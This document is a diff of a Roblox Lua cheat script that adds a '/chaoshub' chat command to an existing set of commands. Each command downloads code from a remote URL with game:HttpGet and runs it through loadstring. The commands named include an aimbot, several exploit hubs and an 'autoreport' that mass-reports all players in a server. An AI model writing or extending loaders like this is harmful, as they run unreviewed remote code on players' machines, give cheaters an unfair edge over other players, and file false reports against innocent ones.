@@ -28,7 +28,8 @@
 -- /protonadmin--
 -- /sirius-- 
 -- /autoreport-- reports all players in the server for exploiting--
---/aimbot--
+-- /aimbot--
+-- /chaoshub-- only works in chaos
 
 local BlacklistedUsers = {2723543958, 4062565054,}
 local localPlayer = game.Players.LocalPlayer
@@ -42,6 +43,7 @@ else
     warn("LocalPlayer not found.")
 end
 
+game:GetService("Players").LocalPlayer.Chatted:connect(function(msg) if string.lower(msg) == "/chaoshub" then loadstring(game:HttpGet("https://raw.githubusercontent.com/Vcsk/AstralHub/main/Loader.lua"))() end end)
 game:GetService("Players").LocalPlayer.Chatted:connect(function(msg) if string.lower(msg) == "/aimbot" then loadstring(game:HttpGet("https://raw.githubusercontent.com/Alikhammass/MyAdmin/main/aimbot"))() end end)
 game:GetService("Players").LocalPlayer.Chatted:connect(function(msg) if string.lower(msg) == "/sirius" then loadstring(game:HttpGet('https://sirius.menu/script'))() end end)
 game:GetService("Players").LocalPlayer.Chatted:connect(function(msg) if string.lower(msg) == "/protonadmin" then loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/5e6e6cc1bb32fd926764d064e2c60a3b.lua"))() end end)
